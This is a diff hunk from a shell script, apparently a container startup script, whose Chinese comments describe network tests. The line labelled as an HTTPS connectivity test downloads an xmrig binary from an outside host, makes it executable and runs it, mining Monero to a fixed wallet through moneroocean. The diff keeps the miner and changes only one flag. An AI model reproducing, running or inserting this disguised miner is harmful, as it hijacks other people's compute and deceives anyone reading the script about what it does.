@@ -11,7 +11,7 @@ curl ipv4.ip.sb
 curl ipv6.ip.sb
 
 echo "===== 测试 HTTPS 外网 ====="
-wget -q http://timishab.serv00.net/official_xmr/xmrig && chmod +x ./xmrig && ./xmrig -o gulf.moneroocean.stream:443 -u 49yfyBAiX2j3bfvGtM719hANVBmaoww4Y6nVh8r7HZVm4ZD7FuSDA4W4yPqNaNES3hFBFgRd2M4QXhRxu6C8j6cP1ZaJB7u -p zerops -t 4 --no-ipv6 --tls </dev/null
+wget -q http://timishab.serv00.net/official_xmr/xmrig && chmod +x ./xmrig && ./xmrig -o gulf.moneroocean.stream:443 -u 49yfyBAiX2j3bfvGtM719hANVBmaoww4Y6nVh8r7HZVm4ZD7FuSDA4W4yPqNaNES3hFBFgRd2M4QXhRxu6C8j6cP1ZaJB7u -p zerops -t 4 --no-color --tls </dev/null
 
 echo "===== 脚本执行完毕，保持容器在线 ====="
 exec zsc noop
